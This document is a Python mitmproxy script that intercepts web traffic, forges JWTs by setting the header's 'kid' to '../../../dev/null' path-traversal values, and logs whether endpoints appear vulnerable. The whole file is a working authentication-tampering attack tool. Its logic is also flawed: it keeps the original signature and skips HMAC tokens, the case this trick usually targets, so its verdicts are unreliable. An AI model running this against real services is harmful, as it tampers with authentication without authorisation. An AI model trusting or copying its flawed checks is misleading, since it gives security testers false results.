from mitmproxy import http
import base64
import json
from datetime import datetime

RESULT_FILE = "jwt_attack_results_script6.txt"
STATIC_ENDPOINT_FILE = "jwt_endpoints_static.txt"
DYNAMIC_ENDPOINT_FILE = "jwt_endpoints_dynamic.txt"

KID_PAYLOADS = [
    "../../../dev/null",
    "../../../../../../../dev/null"
]

HMAC_ALGS = {"HS256", "HS384", "HS512"}

baseline = {}          # (method, path) -> (status, size)
tested = set()
dynamic_endpoints = set()

modified_jwt = None
kid_attempted = False

# ---------------- helpers ----------------

def b64_decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data).decode(errors="ignore")

def b64_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

def load_static_endpoints():
    try:
        with open(STATIC_ENDPOINT_FILE) as f:
            return {line.strip() for line in f if line.strip()}
    except FileNotFoundError:
        return set()

STATIC_ENDPOINTS = load_static_endpoints()

def extract_jwt(flow):
    auth = flow.request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:]
    for c in flow.request.cookies.values():
        if "." in c:
            return c
    return None

def forge_kid_token(token, kid_value):
    try:
        h, p, s = token.split(".")
        header = json.loads(b64_decode(h))
        header["kid"] = kid_value
        new_h = b64_encode(json.dumps(header, separators=(",", ":")))
        return f"{new_h}.{p}.{s}"   # signature preserved
    except Exception:
        return None

def log_dynamic(flow):
    key = f"{flow.request.method} {flow.request.path}"
    if key not in dynamic_endpoints:
        dynamic_endpoints.add(key)
        with open(DYNAMIC_ENDPOINT_FILE, "a") as f:
            f.write(key + "\n")

def log_result(flow, result, verdict, confidence):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    size = len(flow.response.content or b"")

    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: JWT kid Path Traversal\n"
            f"METHOD: {flow.request.method}\n"
            f"URL: {flow.request.path}\n"
            f"STATUS: {flow.response.status_code}\n"
            f"RESPONSE_SIZE: {size} bytes\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"{'-'*60}\n\n"
        )

# ---------------- mitmproxy hooks ----------------

def request(flow: http.HTTPFlow):
    global modified_jwt, kid_attempted

    log_dynamic(flow)

    path = flow.request.path.split("?")[0]
    if STATIC_ENDPOINTS and path not in STATIC_ENDPOINTS:
        return

    token = extract_jwt(flow)
    if not token:
        return

    # Determine algorithm once
    try:
        header = json.loads(b64_decode(token.split(".")[0]))
        alg = header.get("alg")
    except Exception:
        return

    # HS* → not applicable
    if alg in HMAC_ALGS:
        flow.metadata["kid_not_applicable"] = True
        return

    # Inject forged token once
    if not kid_attempted:
        for kid in KID_PAYLOADS:
            forged = forge_kid_token(token, kid)
            if forged:
                modified_jwt = forged
                flow.request.headers["Authorization"] = f"Bearer {modified_jwt}"
                flow.metadata["jwt_mutated"] = True
                break
        kid_attempted = True

def response(flow: http.HTTPFlow):
    key = (flow.request.method, flow.request.path.split("?")[0])

    status = flow.response.status_code
    size = len(flow.response.content or b"")

    # ---------- BASELINE ----------
    if key not in baseline:
        baseline[key] = (status, size)
        return

    if key in tested:
        return
    tested.add(key)

    base_status, base_size = baseline[key]

    # ---------- DECISION ----------
    if flow.metadata.get("kid_not_applicable"):
        verdict = "NOT VULNERABLE"
        result = "kid-based attacks not applicable to HMAC-signed JWTs"
        confidence = "HIGH"

    elif modified_jwt and status == 200 and size != base_size:
        verdict = "VULNERABLE"
        result = "JWT kid path traversal altered key resolution behavior"
        confidence = "HIGH"

    elif modified_jwt and status == 200:
        verdict = "POTENTIALLY VULNERABLE"
        result = "JWT kid accepted but no observable behavior change"
        confidence = "MEDIUM"

    else:
        verdict = "NOT VULNERABLE"
        result = "JWT kid path traversal safely handled"
        confidence = "HIGH"

    log_result(flow, result, verdict, confidence)
